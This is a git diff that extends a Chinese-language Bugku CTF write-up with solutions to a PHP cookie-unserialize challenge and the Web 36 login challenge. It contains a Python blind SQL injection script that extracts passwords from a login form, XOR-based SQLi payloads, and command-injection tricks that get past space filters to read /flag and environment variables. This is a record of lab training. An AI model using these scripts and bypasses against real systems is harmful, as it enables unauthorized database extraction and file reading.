@@ -293,4 +293,47 @@ else {
 }
 ?>
 ```
-这里的关键点是`unserialize($cookie) === "$KEY"`，
+这里的关键点是`unserialize($cookie) === "$KEY"`，利用在线PHP，`$a=serialize('ctf.bugku.com')`，得到`s:13:"ctf.bugku.com";`，在bp里添加cookie，得到flag。
+
+#### Web 36
+提示： !,!=,=,+,-,^,%
+      全都过滤了绝望吗？
+
+* 解题思路：先跑bp看看关键词屏蔽情况，or和空格过滤了，--也过滤了，替代or的||也未曾幸免,()没有过滤。参考提示，!,!=,=,+,-,^,% （构造的url转码注入）没有被过滤，那么用+替代空格，利用！=构造用户名注入，`amdin'+‘1’！=‘2`，返回`password error`，也就是说这个绕过成功但没有注释掉密码。
+这里照抄WP的盲注：ref https://wxt123.top/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/#Web-36
+```
+# -*- coding: utf-8 -*-
+import requests
+
+session = requests.Session()
+url="http://114.67.246.176:12012/login.php"
+flag=''
+for i in range(1,250):
+        left=32
+        right=128
+        mid=(left+right)//2
+        while(left<right):
+                payload="admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))>%s))^'1"%(i,mid)
+                data = {'uname': payload, 'passwd': 'admin'}
+                res = requests.post(url, data=data)
+                if 'password' in res.text:
+                        left=mid+1
+                else:
+                        right=mid
+                mid=(left+right)//2
+        if(mid==32 or mid==127):
+                break
+        flag=flag+chr(mid)
+        print(flag)
+```
+进去之后是个命令执行框，这里要怒翻文件包含里记下的笔记，利用<代替空格，cat</flag，（加.php会被过滤）
+再记几个可以用的方式：
+    * env :用于输出系统环境变量，这道题中系统环境变量中有flag；
+    * {echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量
+    * {cat,/flag}：绕过空格限制，读取根目录下flag文件；
+    * cat</flag：绕过空格限制，
+    * cat<>/flag：绕过空格限制；
+    * a=$‘\x20/flag’&&cat$a：\x20转换为字符串就是空格;
+再做个关于fuzz后台登录密码的注入笔记：
+    * 判断密码长度：uname=admin'^(length(passwd)=32)^'，逐一递增，并根据32位猜测密码为MD5。
+    * 判断密码每一位字符：uname=admin'^(ascii(substr((passwd)from(1))=52)^'
